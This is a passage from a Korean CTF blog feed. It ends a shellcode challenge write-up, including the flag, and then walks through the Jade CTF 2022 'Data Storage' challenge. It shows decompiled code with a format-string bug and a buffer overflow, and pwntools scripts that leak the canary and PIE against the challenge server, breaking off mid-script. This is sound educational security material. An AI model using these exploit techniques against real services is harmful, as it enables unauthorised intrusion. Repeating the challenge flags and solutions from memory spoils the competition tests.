rsi</span><br><span class="line">   0x7ffd7b94f027                  push   0x8</span><br><span class="line"> → 0x7ffd7b94f029                  add    BYTE PTR [rax], al</span><br><span class="line">   0x7ffd7b94f02b                  add    BYTE PTR [rax], al</span><br><span class="line">   0x7ffd7b94f02d                  add    BYTE PTR [rax], al</span><br><span class="line">   0x7ffd7b94f02f                  add    BYTE PTR [rax], al</span><br><span class="line">   0x7ffd7b94f031                  add    BYTE PTR [rax], al</span><br><span class="line">   0x7ffd7b94f033                  add    BYTE PTR [rax], al</span><br></pre></td></tr></table></figure><p>.. 쉘코드를 실행하다가 멈췄다. 쉘코드가 저장된 곳에 값을 쓰고 있어서 한마디로 실행할 코드가 저장된 곳이 스택인데 그 스택에 이것저것 쓰면서 사용하고 있기 때문에 실행할 코드가 더럽혀졌다.</p><p>그래서 <code>sub rsp, 0x1000</code>을 추가해서 사용하는 스택이랑 쉘코드가 저장되는 스택이랑 다르게 위치시켜주었다.</p><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jadeCTF&#123;d1d_y0u_l1k3_th3_du4l_pwn?&#125;</span><br></pre></td></tr></table></figure><h2 id="tmi"><a href="#tmi" class="headerlink" title="tmi"></a>tmi</h2><p>대회 끝나고 풀었다. 이 바이너리에서 취약점은 비교적 찾기 쉽지만.. flag를 얻기 위한 과정이 순탄치 않았다……….. 새롭게 알게된 것이 있다. base64를 이용해서 리모트 파일을 복사해온다는 정도? </p><p>그리고 원래 알고 있었지만 문제 풀 때 리마인드 된 것들.<br>예를 들면 return address를 건들기 위해서는 함수 return을 해줘야 한다거나, NX bit가 해제되어 있으면 스택에서 Shellcode를 실행시킬 수 있고, 이때 익스 확률을 높이기 위해서 NOP Sled를 할 수 있다는 것 정도?</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Jade CTF </tag>
            
            <tag> Shellcode </tag>
            
            <tag> NOP Sled </tag>
            
            <tag> base64 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jade CTF 2022 - Data Storage (canary, pie)</title>
      <link href="/221026-jadectf2022-data_storage/"/>
      <url>/221026-jadectf2022-data_storage/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>(32&#x2F;630) solves</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>In his DBMS course, Shekhar was learning about CRUD operations. He was taught these operations in SQL, but he wanted to try them out in C. He wrote a program for reading data from input, and then scrambling it so other users can’t figure out what is stored. He gave me the binary to test it, could you help me out?</p><p>nc 34.76.206.46 10003</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">└── chall</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>카나리가 있고 PIE도 있다.. </p><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><p>코드는 간단하다. main()에서 database_store()를 호출하는데 이 함수에 취약한 부분이 존재한다. 그래서 이 함수 하나만 보면 된다.</p><h3 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">database_store</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">16</span>]; <span class="comment">// [rsp+10h] [rbp-230h] BYREF</span></span><br><span class="line">  <span class="type">char</span> yes[<span class="number">16</span>]; <span class="comment">// [rsp+20h] [rbp-220h] BYREF</span></span><br><span class="line">  <span class="type">char</span> input[<span class="number">520</span>]; <span class="comment">// [rsp+30h] [rbp-210h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v17; <span class="comment">// [rsp+238h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v17 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Are you sure that you want to store data [yes/no]?&quot;</span>);</span><br><span class="line">  fgets(s, <span class="number">10</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  s[<span class="built_in">strcspn</span>(s, <span class="string">&quot;\r\n&quot;</span>)] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You entered: &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(s);                                    <span class="comment">// fsb</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nIs that correct?&quot;</span>);</span><br><span class="line">  fgets(yes, <span class="number">10</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  yes[<span class="built_in">strcspn</span>(yes, <span class="string">&quot;\r\n&quot;</span>)] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(yes, <span class="string">&quot;yes&quot;</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now, it&#x27;s time to enter your details&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Note that there is a length given for each field, you have to enter atleast that many characters&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Fill it up with spaces if your input is less&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;Enter your Name(%d), Admission Number(%d), Branch(%d), University(%d), and Address(%d) (in this order):\n&quot;</span>,</span><br><span class="line">    n,</span><br><span class="line">    an,</span><br><span class="line">    b,</span><br><span class="line">    u,</span><br><span class="line">    a[<span class="number">0</span>]);</span><br><span class="line">  gets(input);                                  <span class="comment">// bof</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Scrambling your data so that hackers can&#x27;t steal it...&quot;</span>);</span><br><span class="line">  modify(&amp;name, input, <span class="number">0LL</span>, n);</span><br><span class="line">  v1 = n;</span><br><span class="line">  modify(&amp;admno, input, n, an);</span><br><span class="line">  v2 = an + v1;</span><br><span class="line">  modify(&amp;branch, input, v2, b);</span><br><span class="line">  v3 = b + v2;</span><br><span class="line">  modify(&amp;university, input, v3, u);</span><br><span class="line">  modify(&amp;address, input, u + v3, a[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">memset</span>(input, <span class="number">0</span>, <span class="number">0x200</span>uLL);</span><br><span class="line">  modify(input, &amp;name, <span class="number">0LL</span>, (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">int</span>)n / <span class="number">2</span>));</span><br><span class="line">  v4 = (<span class="type">int</span>)n / <span class="number">2</span>;</span><br><span class="line">  modify(&amp;input[(<span class="type">int</span>)n / <span class="number">2</span>], &amp;branch, <span class="number">0LL</span>, (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">int</span>)b / <span class="number">3</span>));</span><br><span class="line">  v5 = (<span class="type">int</span>)b / <span class="number">3</span> + v4;</span><br><span class="line">  modify(&amp;input[v5], &amp;admno, <span class="number">0LL</span>, (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">int</span>)an / <span class="number">3</span>));</span><br><span class="line">  v6 = (<span class="type">int</span>)an / <span class="number">3</span> + v5;</span><br><span class="line">  modify(&amp;input[v6], &amp;university, <span class="number">0LL</span>, (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">int</span>)u / <span class="number">2</span>));</span><br><span class="line">  v7 = (<span class="type">int</span>)u / <span class="number">2</span> + v6;</span><br><span class="line">  modify(&amp;input[v7], &amp;address, <span class="number">0LL</span>, (<span class="type">unsigned</span> <span class="type">int</span>)(a[<span class="number">0</span>] / <span class="number">10</span>));</span><br><span class="line">  v8 = a[<span class="number">0</span>] / <span class="number">10</span> + v7;</span><br><span class="line">  modify(&amp;input[v8], &amp;branch, (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">int</span>)b / <span class="number">3</span>), b - (<span class="type">int</span>)b / <span class="number">3</span>);</span><br><span class="line">  v9 = b - (<span class="type">int</span>)b / <span class="number">3</span> + v8;</span><br><span class="line">  modify(&amp;input[v9], &amp;name, (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">int</span>)n / <span class="number">2</span>), n - (<span class="type">int</span>)n / <span class="number">2</span>);</span><br><span class="line">  v10 = n - (<span class="type">int</span>)n / <span class="number">2</span> + v9;</span><br><span class="line">  modify(&amp;input[v10], &amp;address, (<span class="type">unsigned</span> <span class="type">int</span>)(a[<span class="number">0</span>] / <span class="number">10</span>), (<span class="type">unsigned</span> <span class="type">int</span>)(a[<span class="number">0</span>] / <span class="number">10</span>));</span><br><span class="line">  v11 = a[<span class="number">0</span>] / <span class="number">10</span> + v10;</span><br><span class="line">  modify(&amp;input[v11], &amp;university, (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">int</span>)u / <span class="number">2</span>), (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">int</span>)u / <span class="number">4</span>));</span><br><span class="line">  v12 = (<span class="type">int</span>)u / <span class="number">4</span> + v11;</span><br><span class="line">  modify(&amp;input[v12], &amp;admno, (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">int</span>)an / <span class="number">3</span>), an - (<span class="type">int</span>)an / <span class="number">3</span>);</span><br><span class="line">  v13 = an - (<span class="type">int</span>)an / <span class="number">3</span> + v12;</span><br><span class="line">  modify(&amp;input[v13], &amp;address, (<span class="type">unsigned</span> <span class="type">int</span>)(<span class="number">2</span> * (a[<span class="number">0</span>] / <span class="number">10</span>)), (<span class="type">unsigned</span> <span class="type">int</span>)(a[<span class="number">0</span>] - <span class="number">2</span> * (a[<span class="number">0</span>] / <span class="number">10</span>)));</span><br><span class="line">  modify(</span><br><span class="line">    &amp;input[a[<span class="number">0</span>] - <span class="number">2</span> * (a[<span class="number">0</span>] / <span class="number">10</span>) + v13],</span><br><span class="line">    &amp;university,</span><br><span class="line">    (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">int</span>)u / <span class="number">2</span> + (<span class="type">int</span>)u / <span class="number">4</span>),</span><br><span class="line">    u - ((<span class="type">int</span>)u / <span class="number">2</span> + (<span class="type">int</span>)u / <span class="number">4</span>));</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v17;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>코드가 복잡해보이지만(?) 기능 분석을 할 필요는 없다. 취약점을 찾는 것이 목표이기 때문에 필요한 부분만 읽으면 된다.</p><p>그러면 fsb와 bof가 대놓고 보이는 것을 찾을 수 있다.</p><p>fsb로 필요한 것을 leak하고 bof를 이용해서 ROP를 하면 된다. 말은 이렇게 간단하지만 익스하는데 꽤나 오래걸렸고 생각보다 스트레스를 받았었다.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>local 기준으로 익스를 작성했는데 remote는 잘 되지 않는 문제(?)가 발생했다. (로되리안 ㅜ)</p><p>local과 remote의 libc가 달라서 스택에 값이 쌓이는게 달라졌다. 그래서 leak할 offset을 루프를 돌려서 찾는 과정이 추가적으로 필요하다.</p><p>아래부터 remote 기준으로 설명을 한다.</p><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><ul><li>사전 작업: fsb를 이용하여 canary, pie offset 찾기</li></ul><ol><li>canary leak하고 main으로 돌리기</li><li>pie leak하고 main으로 돌리기</li><li>got 출력해서 libc 구하기</li><li><code>system(&#39;/bin/sh\x00&#39;)</code>으로 흐름 돌리기</li></ol><h3 id="pre-work"><a href="#pre-work" class="headerlink" title="pre-work"></a>pre-work</h3><h4 id="leak-canary-amp-pie"><a href="#leak-canary-amp-pie" class="headerlink" title="leak canary &amp; pie"></a>leak canary &amp; pie</h4><p>canary leak을 위한 코드는 아래와 같다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;34.76.206.46&#x27;</span>, <span class="number">10003</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">off = <span class="number">30</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        find_canary = <span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(off)+<span class="string">&#x27;$p&#x27;</span></span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;]?\n&#x27;</span>, find_canary)</span><br><span class="line">        off = off+<span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">        leak = p.recvline()</span><br><span class="line">        canary = <span class="built_in">int</span>(leak[<span class="number">2</span>:],<span class="number">16</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(off-<span class="number">1</span>, <span class="built_in">hex</span>(canary))</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#log.info(hex(canary))</span></span><br><span class="line">        </span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;correct?\n&#x27;</span>, <span class="string">b&#x27;yes&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x210</span>-<span class="number">0x8</span>)</span><br><span class="line">        payload += p64(canary)</span><br><span class="line">        payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x8</span></span><br><span class="line">        payload += <span class="string">b&#x27;\x78\x15&#x27;</span> <span class="comment"># ret</span></span><br><span class="line"></span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;:\n&#x27;</span>, payload)</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;]?\n&#x27;</span>)             <span class="comment">######## !!! ########</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="comment">#p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">        p = remote(<span class="string">&#x27;34.76.206.46&#x27;</span>, <span class="number">10003</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>제일 먼저 해야할 일은 canary를 leak하는 것이다. offset을 찾기 위해서 루프를 돌 때 try-except을 이용해서 예외처리를 해주었다. 만약 예외가 발생한다면 다시 remote에 연결해주었는데, <code>p.close()</code>를 안해준다면 프로세스가 계속 살아있기 때문에 remote에 새로 연결해주기 전에 close를 해주어야 한다.</p><p>fsb를 이용해서 leak하고 유효한 주소를 가져오는 과정에서 예외가 발생할 가능성이 존재한다. 주소를 출력할 때 16진수 값이거나 <code>(nil)</code>을 출력해주는데 후자일 경우 <code>int(leak, 16)</code>에서 에러가 발생하기 때문에 except으로 가서 예외처리를 해줄 수 있다. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+] Opening connection to 34.76.206.46 on port 10003: Done</span><br><span class="line">invalid literal for int() with base 16: b&#x27;il)\n&#x27;</span><br><span class="line">[*] Closed connection to 34.76.206.46 port 10003</span><br></pre></td></tr></table></figure><p>루프가 끝나고 pause를 해줬기 때문에 멈추는 곳을 보면 바로 canary를 찾을 수 있다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+] Opening connection to 34.76.206.46 on port 10003: Done</span><br><span class="line">77 0x8a3ffc38e32e9500</span><br><span class="line">[*] Paused (press any to continue)</span><br></pre></td></tr></table></figure><p>offset은 77임을 바로 알 수 있다. </p><p>pause하는 조건은 주석에 <code>!!!</code>한 곳을 보면 알 수 있다. <code>]?\n</code>은 이 함수 초반에 출력하는 문자열 중 일부이다. ret를 이 함수로 돌려주었기 때문에 이것이 출력된다면 leak한 값이 canary임을 바로 확인할 수 있다.</p><p>사실 canary가 구해져도 바로 ret로 돌릴 수가 없다. 왜냐하면 pie base의 값이 랜덤이기 때문에 아래와 같은 base이길 기대해야한다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x561aa9000000</span><br></pre></td></tr></table></figure><p>내가 돌리고 싶은 주소는 <code>pie_base + 0x1578</code>인데 디버깅을 하다보면 <code>0x01578</code>이 고정인 것을 알 수 있다. 2.5바이트가 고정인데 0.5바이트만 쓸 수 없으니 2바이트만 덮을 수 있다. ret를 2바이트만 덮으면 어차피 끝에 null이 자동으로 붙기 때문에 1&#x2F;16의 확률로 내가 원하는 함수로 흐름을 돌릴 수 있게 된다.</p><p>canary leak을 성공하고 흐름 돌리는 것도 성공하면 이제 pie leak을 하면 된다. pie leak도 canary를 leak한 것과 동일하게 진행하면 된다. 다만 차이점은 canary는 rip를 바꾸면서 검증이 바로 되어서 알 수 있는 반면에 pie는 offset과 함께 출력해주면서 pie 주소인 것을 leak하면 된다.</p><p>그렇게 구한 leak할 pie offset은 85이다.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><p>문제 풀 때의 기억을 살리고 싶어서 그 때 작성했던 익스 코드를 그대로 올린다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;34.76.206.46&#x27;</span>, <span class="number">10003</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">off = <span class="number">30</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        off = <span class="number">77</span></span><br><span class="line">        find_canary = <span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(off)+<span class="string">&#x27;$p&#x27;</span></span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;]?\n&#x27;</span>, find_canary)</span><br><span class="line">        <span class="comment">#off = off+1</span></span><br><span class="line">        </span><br><span class="line">        p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">        leak = p.recvline()</span><br><span class="line">        canary = <span class="built_in">int</span>(leak[<span class="number">2</span>:],<span class="number">16</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#print(off, hex(canary))</span></span><br><span class="line">        </span><br><span class="line">        log.info(<span class="built_in">hex</span>(canary))</span><br><span class="line">        </span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;correct?\n&#x27;</span>, <span class="string">b&#x27;yes&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x210</span>-<span class="number">0x8</span>)</span><br><span class="line">        payload += p64(canary)</span><br><span class="line">        payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x8</span></span><br><span class="line">        payload += <span class="string">b&#x27;\x78\x15&#x27;</span></span><br><span class="line"></span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;:\n&#x27;</span>, payload)</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;]?\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="comment">#p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">        p = remote(<span class="string">&#x27;34.76.206.46&#x27;</span>, <span class="number">10003</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">off = 30</span></span><br><span class="line"><span class="string">while 1:</span></span><br><span class="line"><span class="string">    try:</span></span><br><span class="line"><span class="string">        off = 85 </span></span><br><span class="line"><span class="string">        find_pie = &#x27;%&#x27;+str(off)+&#x27;$p&#x27;</span></span><br><span class="line"><span class="string">        p.sendline(find_pie)</span></span><br><span class="line"><span class="string">        #off = off+1</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        p.recvuntil(&#x27;: &#x27;)</span></span><br><span class="line"><span class="string">        leak = p.recvline()</span></span><br><span class="line"><span class="string">        pie = int(leak[2:],16)</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        print(off, hex(pie))</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        p.sendlineafter(&#x27;correct?\n&#x27;, b&#x27;yes&#x27;)</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        payload = b&#x27;&#x27;</span></span><br><span class="line"><span class="string">        payload += b&#x27;A&#x27; * 